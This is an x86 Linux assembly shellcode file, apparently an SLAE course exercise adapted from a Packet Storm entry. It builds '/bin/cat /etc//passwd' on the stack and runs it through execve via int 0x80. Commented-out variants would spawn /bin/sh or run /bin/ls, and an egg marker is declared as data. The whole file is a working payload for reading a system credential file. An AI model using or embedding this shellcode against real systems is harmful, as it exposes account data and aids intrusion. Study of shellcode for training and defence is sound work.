; Author:   SLAE-755
; Thanks to https://dl.packetstormsecurity.net/shellcode/linux-etcpasswd.txt

global _start			

dd 0x50905090
dd 0x50905090


section .text
_start:

	; PUSH the first null dword 
	xor eax, eax
	push eax

	; PUSH //bin/sh (8 bytes) 

;	push 0x68732f2f
;	push 0x6e69622f

	; PUSH //bin/ls 

;	push 0x736c2f2f
;	push 0x6e69622f

;	mov ebx, esp

;	push eax
;	mov edx, esp

;	push ebx
;	mov ecx, esp


;	mov al, 11
;	int 0x80



	cdq
	push edx 

	; PUSH /bin/cat
	push dword 0x7461632f
	push dword 0x6e69622f


	mov ebx,esp  
        push edx 
        
	; PUSH /etc//passwd
	push dword 0x64777373 
        push dword 0x61702f2f 
        push dword 0x6374652f

	mov ecx,esp  
	mov al, 11

	push edx
	push ecx
	push ebx

	mov ecx,esp  
	int 0x80
